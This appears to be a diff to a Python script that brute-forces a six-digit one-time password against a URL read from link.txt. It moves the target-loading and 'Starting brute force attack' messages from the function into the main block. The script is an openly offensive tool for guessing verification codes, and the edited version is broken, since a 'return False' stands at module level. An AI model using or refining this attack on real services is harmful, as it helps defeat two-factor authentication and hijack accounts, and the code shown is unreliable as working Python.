@@ -2,15 +2,6 @@ import requests
 import time
 
 def brute_force_attack(url):
-    try:
-        with open('link.txt', 'r') as f:
-            target_url = f.read().strip()
-    except FileNotFoundError:
-        print("ERROR: link.txt not found in repository root")
-        return False
-    
-    print(f"Starting brute force attack on: {target_url}")
-    print("Searching for valid OTP between 000000 and 999999...")
     
     for otp in range(1000000):
         otp_str = f"{otp:06d}"
@@ -36,5 +27,19 @@ def brute_force_attack(url):
     print("Brute force completed. No valid OTP found in the range 000000-999999.")
     return False
 
+
+
+
 if __name__ == "__main__":
-    brute_force_attack()
+
+    try:
+        with open('link.txt', 'r') as f:
+            target_url = f.read().strip()
+    except FileNotFoundError:
+        print("ERROR: link.txt not found in repository root")
+        return False
+    
+    print(f"Starting brute force attack on: {target_url}")
+    print("Searching for valid OTP between 000000 and 999999...")
+    
+    brute_force_attack(target_url)
